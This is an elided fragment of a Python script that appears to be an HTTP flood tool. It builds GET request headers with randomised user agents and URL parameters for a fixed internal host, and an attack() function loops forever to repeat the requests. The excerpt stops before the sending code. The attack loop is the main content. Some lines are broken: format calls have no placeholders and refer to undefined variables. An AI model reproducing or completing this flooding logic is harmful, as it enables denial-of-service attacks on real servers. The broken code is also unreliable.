...
def create_header(useragent, urlparameter, site_ref):   
    global content_length
    
    header = 'GET /freeweb-1.0.0-BUILD-SNAPSHOT/home/main HTTP/1.1\r\n'.format(path)
    header += 'Host: 172.30.1.19:8080\r\n'.format(domain)
...
def attack():
    ...
    while True:
        useragent_to_choose = str(randomchoice(user_agent))  
        ...
        header = create_header(useragent_to_choose, random_url_parameter, site_ref)    
        #print (header)
        try:
